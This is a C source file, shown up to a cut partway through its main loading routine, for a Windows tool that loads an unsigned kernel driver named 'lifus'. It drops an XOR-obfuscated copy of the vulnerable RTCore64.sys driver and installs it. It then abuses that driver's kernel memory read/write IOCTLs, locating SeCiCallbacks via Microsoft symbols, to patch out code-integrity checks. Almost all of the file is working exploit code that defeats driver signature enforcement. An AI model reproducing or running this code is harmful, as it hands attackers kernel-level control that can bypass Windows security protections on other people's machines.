#include <windows.h>
#include <winioctl.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>
#include "rtcore64.h"
#define RTC_IOCTL_READ 0x80002048UL
#define RTC_IOCTL_WRITE 0x8000204CUL
#define SECI_CALLBACK_OFFSET 0x20ULL
#define DEFAULT_SECI_RVA 0xF04740ULL
#define DEFAULT_SAFE_RVA 0x69C1B0ULL
#define SYMBOL_SERVER_URL L"https://msdl.microsoft.com/download/symbols"
#define STATE_KEY_PATH L"Software\\lifus\\LatestState"
#define HVCI_KEY_PATH                                                                                        \
    L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"
#define VULN_SERVICE_NAME L"RTCore64"
#define VULN_DEVICE_PATH L"\\\\.\\RTCore64"
#define VULN_SERVICE_BINPATH L"System32\\drivers\\RTCore64.sys"
#define VULN_FILE_PATH L"%s\\System32\\drivers\\RTCore64.sys"
#define STATUS_INFO_LENGTH_MISMATCH_L 0xC0000004L
#define SYSTEM_MODULE_INFORMATION_CLASS 11
#define DEVICE_PATH L"\\\\.\\lifus"
#define SERVICE_NAME L"lifus"
#pragma warning(disable : 4996)

typedef struct _RTC_PACKET {
    BYTE Pad0[8];
    ULONGLONG Address;
    BYTE Pad1[8];
    ULONG Size;
    ULONG Value;
    BYTE Pad3[16];
} RTC_PACKET;

typedef struct _SYSTEM_MODULE_ENTRY_L {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY_L;

typedef struct _SYSTEM_MODULE_INFORMATION_L {
    ULONG NumberOfModules;
    SYSTEM_MODULE_ENTRY_L Modules[1];
} SYSTEM_MODULE_INFORMATION_L;

typedef LONG NTSTATUS_L;
typedef NTSTATUS_L(NTAPI* pNtQuerySystemInformation_L)(ULONG, PVOID, ULONG, PULONG);

typedef struct _LOADER_UNICODE_STRING_L {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} LOADER_UNICODE_STRING_L;

typedef LONG(NTAPI* pNtUnloadDriver_L)(LOADER_UNICODE_STRING_L*);

static const BYTE xor_key[7] = {0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C};

static void dbg(const WCHAR* msg) {
    OutputDebugStringW(msg);
}

static void GetVulnFilePath(WCHAR* out, DWORD size) {
    WCHAR sysRoot[MAX_PATH];
    if (GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH) == 0 || wcslen(sysRoot) == 0)
        GetWindowsDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(out, size, VULN_FILE_PATH, sysRoot);
}

static BOOL ExtractDriver(void) {
    WCHAR path[MAX_PATH];
    GetVulnFilePath(path, MAX_PATH);
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    BYTE* buf = (BYTE*)malloc(sizeof(kRtCore64Enc));
    if (!buf) {
        CloseHandle(hFile);
        return FALSE;
    }
    for (UINT i = 0; i < sizeof(kRtCore64Enc); i++)
        buf[i] = kRtCore64Enc[i] ^ xor_key[i % sizeof(xor_key)];
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, buf, sizeof(kRtCore64Enc), &written, NULL) && written == sizeof(kRtCore64Enc);
    free(buf);
    CloseHandle(hFile);
    return ok;
}

static BOOL StopAndDeleteService(SC_HANDLE scm, const WCHAR* name) {
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
    if (!svc)
        return TRUE;
    BOOL ok = TRUE;
    SERVICE_STATUS st;
    if (QueryServiceStatus(svc, &st) && st.dwCurrentState != SERVICE_STOPPED &&
        st.dwCurrentState != SERVICE_STOP_PENDING) {
        if (!ControlService(svc, SERVICE_CONTROL_STOP, &st)) {
            ok = FALSE;
        } else {
            for (int i = 0; i < 100; i++) {
                if (!QueryServiceStatus(svc, &st))
                    break;
                if (st.dwCurrentState == SERVICE_STOPPED)
                    break;
                Sleep(100);
            }
            if (st.dwCurrentState != SERVICE_STOPPED)
                ok = FALSE;
        }
    }
    if (ok)
        DeleteService(svc);
    CloseServiceHandle(svc);
    return ok;
}

static BOOL ServiceIsRunning(SC_HANDLE scm, const WCHAR* name) {
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_QUERY_STATUS);
    if (!svc)
        return FALSE;
    SERVICE_STATUS st;
    BOOL running = QueryServiceStatus(svc, &st) && st.dwCurrentState == SERVICE_RUNNING;
    CloseServiceHandle(svc);
    return running;
}

static BOOL InstallVulnerableDriver(void) {
    if (!ExtractDriver())
        return FALSE;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm)
        return FALSE;
    StopAndDeleteService(scm, VULN_SERVICE_NAME);
    SC_HANDLE svc =
        CreateServiceW(scm, VULN_SERVICE_NAME, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, VULN_SERVICE_BINPATH, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        CloseServiceHandle(scm);
        return FALSE;
    }
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return FALSE;
        }
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

static void RemoveVulnerableDriver(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        StopAndDeleteService(scm, VULN_SERVICE_NAME);
        CloseServiceHandle(scm);
    }
    WCHAR path[MAX_PATH];
    GetVulnFilePath(path, MAX_PATH);
    DeleteFileW(path);
}

static BOOL OpenRtcDevice(HANDLE* out) {
    for (int i = 0; i < 30; i++) {
        HANDLE h =
            CreateFileW(VULN_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            *out = h;
            return TRUE;
        }
        Sleep(100);
    }
    return FALSE;
}

static BOOL EnablePrivilege_L(const WCHAR* name);

typedef struct _KERNEL_MODULE_L {
    ULONGLONG Base;
    ULONG Size;
    WCHAR Name[64];
} KERNEL_MODULE_L;

static BOOL EnumKernelModules(KERNEL_MODULE_L* modules, ULONG maxCount, ULONG* countOut) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;
    pNtQuerySystemInformation_L query =
        (pNtQuerySystemInformation_L)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!query)
        return FALSE;
    EnablePrivilege_L(L"SeDebugPrivilege");
    ULONG length = 0x100000;
    for (int attempt = 0; attempt < 6; attempt++) {
        PVOID buf = malloc(length);
        if (!buf)
            return FALSE;
        ULONG needed = 0;
        LONG st = query(SYSTEM_MODULE_INFORMATION_CLASS, buf, length, &needed);
        if (st == STATUS_INFO_LENGTH_MISMATCH_L) {
            free(buf);
            length = needed + 0x10000;
            continue;
        }
        if (st != 0) {
            free(buf);
            return FALSE;
        }
        SYSTEM_MODULE_INFORMATION_L* info = (SYSTEM_MODULE_INFORMATION_L*)buf;
        ULONG count = info->NumberOfModules;
        if (count > maxCount)
            count = maxCount;
        for (ULONG i = 0; i < count; i++) {
            const char* name = (const char*)info->Modules[i].FullPathName + info->Modules[i].OffsetToFileName;
            modules[i].Base = (ULONGLONG)(ULONG_PTR)info->Modules[i].ImageBase;
            modules[i].Size = info->Modules[i].ImageSize;
            MultiByteToWideChar(CP_ACP, 0, name, -1, modules[i].Name, 64);
        }
        *countOut = count;
        free(buf);
        return TRUE;
    }
    return FALSE;
}

static BOOL GetNtoskrnlBase(ULONGLONG* baseOut, ULONG* sizeOut) {
    KERNEL_MODULE_L modules[512];
    for (int attempt = 0; attempt < 5; attempt++) {
        ULONG count = 0;
        if (!EnumKernelModules(modules, 512, &count))
            return FALSE;
        for (ULONG i = 0; i < count; i++) {
            if (_wcsicmp(modules[i].Name, L"ntoskrnl.exe") == 0) {
                if (modules[i].Base != 0) {
                    *baseOut = modules[i].Base;
                    *sizeOut = modules[i].Size;
                    return TRUE;
                }
                break;
            }
        }
        Sleep(2000);
    }
    return FALSE;
}

static BOOL SafeRvaInText(ULONGLONG rva) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR path[MAX_PATH];
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(path, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return FALSE;
    }
    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }
    BOOL ok = FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (memcmp(sec[i].Name, ".text", 5) == 0) {
                    ULONGLONG va = sec[i].VirtualAddress;
                    ULONGLONG vs = sec[i].Misc.VirtualSize;
                    if (rva >= va && rva < va + vs)
                        ok = TRUE;
                    break;
                }
            }
        }
    }
    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

typedef struct _PDB_INFO_L {
    WCHAR Name[64];
    WCHAR Guid[64];
} PDB_INFO_L;

static BOOL GetPdbInfo(const WCHAR* pePath, PDB_INFO_L* info) {
    HANDLE hFile = CreateFileW(pePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        CloseHandle(hFile);
        return FALSE;
    }
    LPVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return FALSE;
    }
    BOOL ok = FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            DWORD dirRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
            DWORD dirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
            if (dirRva && dirSize) {
                PIMAGE_DEBUG_DIRECTORY dir = (PIMAGE_DEBUG_DIRECTORY)((BYTE*)base + dirRva);
                for (DWORD i = 0; i < dirSize / sizeof(IMAGE_DEBUG_DIRECTORY); i++) {
                    if (dir[i].Type == IMAGE_DEBUG_TYPE_CODEVIEW) {
                        typedef struct _CV_PDB70 {
                            DWORD CvSig;
                            GUID Sig;
                            DWORD Age;
                            char FileName[1];
                        } CV_PDB70;

                        CV_PDB70* cv = (CV_PDB70*)((BYTE*)base + dir[i].AddressOfRawData);
                        if (cv->CvSig == 0x53445352) {
                            swprintf_s(info->Guid, 64, L"%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X%X",
                                cv->Sig.Data1, cv->Sig.Data2, cv->Sig.Data3, cv->Sig.Data4[0],
                                cv->Sig.Data4[1], cv->Sig.Data4[2], cv->Sig.Data4[3], cv->Sig.Data4[4],
                                cv->Sig.Data4[5], cv->Sig.Data4[6], cv->Sig.Data4[7], cv->Age);
                            if (MultiByteToWideChar(CP_UTF8, 0, cv->FileName, -1, info->Name, 64) == 0)
                                wcscpy_s(info->Name, 64, L"ntkrnlmp.pdb");
                            ok = TRUE;
                            break;
                        }
                    }
                }
            }
        }
    }
    UnmapViewOfFile(base);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

static BOOL DownloadFile(const WCHAR* url, const WCHAR* outputPath) {
    URL_COMPONENTSW parts;
    WCHAR host[256];
    WCHAR path[2048];
    memset(&parts, 0, sizeof(parts));
    parts.dwStructSize = sizeof(parts);
    parts.lpszHostName = host;
    parts.dwHostNameLength = 256;
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(url, 0, 0, &parts))
        return FALSE;
    HINTERNET session = WinHttpOpen(
        L"ob/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session)
        return FALSE;
    HINTERNET conn = WinHttpConnect(session, host, parts.nPort, 0);
    if (!conn) {
        WinHttpCloseHandle(session);
        return FALSE;
    }
    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, parts.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
    if (!req) {
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return FALSE;
    }
    BOOL ok = FALSE;
    if (WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(req, NULL)) {
        DWORD status = 0;
        DWORD statusSize = sizeof(status);
        WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize, WINHTTP_NO_HEADER_INDEX);
        if (status == 200) {
            HANDLE hFile =
                CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                BYTE buffer[8192];
                DWORD rd = 0;
                DWORD written = 0;
                ok = TRUE;
                while (WinHttpReadData(req, buffer, sizeof(buffer), &rd) && rd > 0) {
                    if (!WriteFile(hFile, buffer, rd, &written, NULL)) {
                        ok = FALSE;
                        break;
                    }
                }
                CloseHandle(hFile);
                if (!ok)
                    DeleteFileW(outputPath);
            }
        }
    }
    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return ok;
}

static BOOL EnsurePdbDownloaded(void) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR ntosPath[MAX_PATH];
    WCHAR progData[MAX_PATH];
    WCHAR cacheDir[MAX_PATH];
    WCHAR pdbDir[MAX_PATH];
    WCHAR pdbPath[MAX_PATH];
    WCHAR url[1024];
    PDB_INFO_L info;
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(ntosPath, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    if (!GetPdbInfo(ntosPath, &info))
        return FALSE;
    if (GetEnvironmentVariableW(L"ProgramData", progData, MAX_PATH) == 0)
        wcscpy_s(progData, MAX_PATH, L"C:\\ProgramData");
    swprintf_s(cacheDir, MAX_PATH, L"%s\\dbg\\sym", progData);
    CreateDirectoryW(cacheDir, NULL);
    swprintf_s(pdbDir, MAX_PATH, L"%s\\%s\\%s", cacheDir, info.Name, info.Guid);
    CreateDirectoryW(pdbDir, NULL);
    swprintf_s(pdbPath, MAX_PATH, L"%s\\%s", pdbDir, info.Name);
    if (GetFileAttributesW(pdbPath) != INVALID_FILE_ATTRIBUTES)
        return TRUE;
    swprintf_s(url, 1024, L"%s/%s/%s/%s", SYMBOL_SERVER_URL, info.Name, info.Guid, info.Name);
    if (!DownloadFile(url, pdbPath))
        return FALSE;
    return TRUE;
}

static BOOL LookupSymbol(DWORD64 baseAddr, const WCHAR* name, ULONGLONG* out) {
    BYTE buffer[sizeof(SYMBOL_INFOW) + MAX_SYM_NAME * sizeof(WCHAR)];
    PSYMBOL_INFOW sym = (PSYMBOL_INFOW)buffer;
    memset(buffer, 0, sizeof(buffer));
    sym->SizeOfStruct = sizeof(SYMBOL_INFOW);
    sym->MaxNameLen = MAX_SYM_NAME;
    WCHAR qualified[256];
    swprintf_s(qualified, 256, L"ntoskrnl.exe!%s", name);
    if (!SymFromNameW(GetCurrentProcess(), qualified, sym)) {
        memset(buffer, 0, sizeof(buffer));
        sym->SizeOfStruct = sizeof(SYMBOL_INFOW);
        sym->MaxNameLen = MAX_SYM_NAME;
        if (!SymFromNameW(GetCurrentProcess(), name, sym))
            return FALSE;
    }
    *out = sym->Address - baseAddr;
    return TRUE;
}

static BOOL ResolveOffsets(ULONGLONG* seciRva, ULONGLONG* safeRva) {
    WCHAR sysRoot[MAX_PATH];
    WCHAR ntosPath[MAX_PATH];
    WCHAR progData[MAX_PATH];
    WCHAR cachePath[MAX_PATH];
    GetSystemDirectoryW(sysRoot, MAX_PATH);
    swprintf_s(ntosPath, MAX_PATH, L"%s\\ntoskrnl.exe", sysRoot);
    if (GetEnvironmentVariableW(L"ProgramData", progData, MAX_PATH) == 0)
        wcscpy_s(progData, MAX_PATH, L"C:\\ProgramData");
    swprintf_s(cachePath, MAX_PATH, L"%s\\dbg\\sym", progData);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
    if (!SymInitializeW(GetCurrentProcess(), cachePath, FALSE))
        return FALSE;
    BOOL ok = FALSE;
    DWORD64 baseAddr = SymLoadModuleExW(GetCurrentProcess(), NULL, ntosPath, NULL, 0x10000000, 0, NULL, 0);
    if (baseAddr) {
        ULONGLONG seci = 0;
        ULONGLONG safe = 0;
        if (LookupSymbol(baseAddr, L"SeCiCallbacks", &seci) &&
            LookupSymbol(baseAddr, L"ZwFlushInstructionCache", &safe)) {
            *seciRva = seci;
            *safeRva = safe;
            ok = TRUE;
        }
        SymUnloadModule64(GetCurrentProcess(), baseAddr);
    }
    SymCleanup(GetCurrentProcess());
    return ok;
}

static BOOL ReadMem32(HANDLE h, ULONGLONG address, ULONG* value) {
    RTC_PACKET pkt;
    DWORD returned = 0;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address;
    pkt.Size = 4;
    if (!DeviceIoControl(h, RTC_IOCTL_READ, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    *value = pkt.Value;
    return TRUE;
}

static BOOL ReadMem64(HANDLE h, ULONGLONG address, ULONGLONG* value) {
    ULONG low, high;
    if (!ReadMem32(h, address, &low))
        return FALSE;
    if (!ReadMem32(h, address + 4, &high))
        return FALSE;
    *value = ((ULONGLONG)high << 32) | low;
    return TRUE;
}

static BOOL WriteMem64(HANDLE h, ULONGLONG address, ULONGLONG value) {
    RTC_PACKET pkt;
    DWORD returned = 0;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address;
    pkt.Size = 4;
    pkt.Value = (ULONG)(value & 0xFFFFFFFF);
    if (!DeviceIoControl(h, RTC_IOCTL_WRITE, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    memset(&pkt, 0, sizeof(pkt));
    pkt.Address = address + 4;
    pkt.Size = 4;
    pkt.Value = (ULONG)((value >> 32) & 0xFFFFFFFF);
    if (!DeviceIoControl(h, RTC_IOCTL_WRITE, &pkt, sizeof(pkt), &pkt, sizeof(pkt), &returned, NULL))
        return FALSE;
    return TRUE;
}

static BOOL SaveState(ULONGLONG callback) {
    HKEY key;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, STATE_KEY_PATH, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL) !=
        ERROR_SUCCESS)
        return FALSE;
    DWORD patched = 1;
    RegSetValueExW(key, L"IsPatched", 0, REG_DWORD, (const BYTE*)&patched, sizeof(patched));
    BOOL ok = RegSetValueExW(key, L"OriginalCallback", 0, REG_QWORD, (const BYTE*)&callback,
                  sizeof(callback)) == ERROR_SUCCESS;
    RegCloseKey(key);
    return ok;
}

static void ClearState(void) {
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, STATE_KEY_PATH, 0, KEY_WRITE, &key) == ERROR_SUCCESS) {
        DWORD patched = 0;
        RegSetValueExW(key, L"IsPatched", 0, REG_DWORD, (const BYTE*)&patched, sizeof(patched));
        RegDeleteValueW(key, L"OriginalCallback");
        RegCloseKey(key);
    }
}

static BOOL HvciEnabled(void) {
    HKEY key;
    DWORD enabled = 0;
    DWORD size = sizeof(enabled);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, HVCI_KEY_PATH, 0, KEY_READ, &key) != ERROR_SUCCESS)
        return FALSE;
    BOOL is_on = RegQueryValueExW(key, L"Enabled", NULL, NULL, (BYTE*)&enabled, &size) == ERROR_SUCCESS &&
        enabled == 1;
    RegCloseKey(key);
    return is_on;
}

static BOOL EnablePrivilege_L(const WCHAR* name) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &tkp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return ok;
}

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} USTRING;

typedef LONG(NTAPI* pfn_unload)(USTRING*);
typedef VOID(NTAPI* pfn_init)(USTRING*, PCWSTR);

static void ForceUnloadStale(const WCHAR* name) {
    pfn_unload pUnload = (pfn_unload)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
    pfn_init pInit = (pfn_init)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
    if (!pUnload || !pInit)
        return;
    EnablePrivilege_L(L"SeLoadDriverPrivilege");
    WCHAR regPath[512];
    swprintf_s(regPath, 512, L"SYSTEM\\CurrentControlSet\\Services\\%s", name);
    HKEY key;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, NULL) !=
        ERROR_SUCCESS)
        return;
    DWORD type = 1;
    RegSetValueExW(key, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
    WCHAR tmp[MAX_PATH], img[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    swprintf_s(img, MAX_PATH, L"\\??\\%s%s.sys", tmp, name);
    RegSetValueExW(key, L"ImagePath", 0, REG_SZ, (BYTE*)img, (DWORD)((wcslen(img) + 1) * sizeof(WCHAR)));
    RegCloseKey(key);
    WCHAR ntPath[512];
    swprintf_s(ntPath, 512, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s", name);
    USTRING us;
    pInit(&us, ntPath);
    pUnload(&us);
    swprintf_s(regPath, 512, L"SYSTEM\\CurrentControlSet\\Services\\%s", name);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
}

static BOOL StartTargetService(const WCHAR* path, DWORD* errOut) {
    const WCHAR* serviceName = SERVICE_NAME;
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        *errOut = GetLastError();
        return FALSE;
    }
    if (!StopAndDeleteService(scm, serviceName) && ServiceIsRunning(scm, serviceName)) {
        CloseServiceHandle(scm);
        ForceUnloadStale(serviceName);
        Sleep(500);
        scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!scm) {
            *errOut = GetLastError();
            return FALSE;
        }
        StopAndDeleteService(scm, serviceName);
    }
    SC_HANDLE svc = CreateServiceW(scm, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        DWORD ce = GetLastError();
        if (ce == ERROR_SERVICE_EXISTS || ce == ERROR_SERVICE_MARKED_FOR_DELETE) {
            if (ce == ERROR_SERVICE_MARKED_FOR_DELETE)
                Sleep(500);
            svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
        }
        if (svc)
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, path, NULL,
                NULL, NULL, NULL, NULL, NULL);
    }
    if (!svc) {
        *errOut = GetLastError();
        CloseServiceHandle(scm);
        return FALSE;
    }
    BOOL ok = FALSE;
    if (!StartServiceW(svc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            ok = TRUE;
        } else if (err == ERROR_ALREADY_EXISTS) {
            DeleteService(svc);
            CloseServiceHandle(svc);
            svc = NULL;
            CloseServiceHandle(scm);
            ForceUnloadStale(serviceName);
            Sleep(500);
            scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (scm) {
                svc = CreateServiceW(scm, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
                if (!svc && GetLastError() == ERROR_SERVICE_EXISTS)
                    svc = OpenServiceW(scm, serviceName, SERVICE_ALL_ACCESS);
                if (svc) {
                    if (StartServiceW(svc, 0, NULL))
                        ok = TRUE;
                    else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                        ok = TRUE;
                    else
                        *errOut = GetLastError();
                } else {
                    *errOut = GetLastError();
                }
            } else {
                *errOut = GetLastError();
            }
        } else {
            *errOut = err;
        }
    } else {
        ok = TRUE;
    }
    if (svc)
        CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

static BOOL DriverAlreadyLoaded(void) {
    HANDLE h = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return FALSE;
    CloseHandle(h);
    return TRUE;
}

static BOOL GetDriverPath(WCHAR* out, DWORD size) {
    HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(103), RT_RCDATA);
    if (!res)
        return FALSE;
    HGLOBAL loaded = LoadResource(NULL, res);
    if (!loaded)
        return FALSE;
    void* data = LockResource(loaded);
    DWORD dataSize = SizeofResource(NULL, res);
    if (!data || !dataSize)
        return FALSE;
    WCHAR tmp[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmp))
        return FALSE;
    swprintf_s(out, size, L"%slf_drv.sys", tmp);
    HANDLE f = CreateFileW(out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return FALSE;
    DWORD written;
    BOOL ok = WriteFile(f, data, dataSize, &written, NULL) && written == dataSize;
    CloseHandle(f);
    return ok;
}

int LoadDriver(void) {
    if (DriverAlreadyLoaded())
        return 0;

    if (HvciEnabled()) {
        dbg(L"[ob] HVCI enabled, cannot load unsigned driver\n");
        return 2;
    }

    WCHAR driverPath[MAX_PATH];
    if (!GetDriverPath(driverPath, MAX_PATH)) {
        dbg(L"[ob] lifus.sys not found next to executable\n");
        return 3;
    }

    ULONGLONG seciRva = DEFAULT_SECI_RVA;
    ULONGLONG safeRva = DEFAULT_SAFE_RVA;

    if (!EnsurePdbDownloaded() || !ResolveOffsets(&seciRva, &safeRva)) {
        dbg(L"[ob] symbol resolution failed, using defaults\n");
        seciRva = DEFAULT_SECI_RVA;
        safeRva = DEFAULT_SAFE_RVA;
    }

    if (!InstallVulnerableDriver()) {
        dbg(L"[ob] failed to install vulnerable driver\n");
        return 4;
    }

    HANDLE hDev = INVALID_HANDLE_VALUE;
    if (!OpenRtcDevice(&hDev)) {
        dbg(L"[ob] cannot open RTCore64 device\n");
        RemoveVulnerableDriver();
        return 5;
    }

    ULONGLONG ntBase = 0;
    ULONG ntSize = 0;
    if (!GetNtoskrnlBase(&ntBase, &ntSize)) {
        dbg(L"[ob] cannot locate ntoskrnl.exe\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 6;
    }

    ULONG dosMagic = 0;
    if (!ReadMem32(hDev, ntBase, &dosMagic) || (dosMagic & 0xFFFF) != 0x5A4D) {
        dbg(L"[ob] kernel base verification failed\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 7;
    }

    if (!SafeRvaInText(safeRva)) {
        dbg(L"[ob] safe function RVA not in .text\n");
        CloseHandle(hDev);
        RemoveVulnerableDriver();
        return 8;
